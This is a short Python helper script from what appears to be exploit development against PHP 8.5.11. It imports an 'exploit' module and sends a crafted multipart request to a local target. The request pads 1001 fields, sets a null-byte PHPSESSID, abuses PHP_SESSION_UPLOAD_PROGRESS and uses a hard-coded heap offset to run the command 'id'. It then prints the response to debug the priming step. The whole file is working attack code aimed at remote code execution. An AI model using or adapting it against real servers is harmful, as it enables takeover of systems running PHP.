#!/usr/bin/env python3
"""Dump request-A (priming) full response on 8.5.11 to see why no Set-Cookie in request B."""
import os
import sys, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from exploit import Target, Exploit, build_multipart

t = Target("http://127.0.0.1:18114/index.php", timeout=60.0, verbose=False)
ex = Exploit(t, "id", htdata_offset=0x690d8, profile="bookworm")
parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
parts += [{"name": "PHPSESSID", "data": b"\x00"},
          {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
          ex._file_part(), ex._big_field()]
rA = t.post(build_multipart(parts, b"S"*17), b"S"*17, read_cap=9<<20)
head, _, body = rA.partition(b"\r\n\r\n")
print("=== request A headers ===")
print(head.decode("latin1","replace"))
print("=== request A body (full) ===")
print(body.decode("latin1","replace"))
print("=== request A total len:", len(rA), "===")
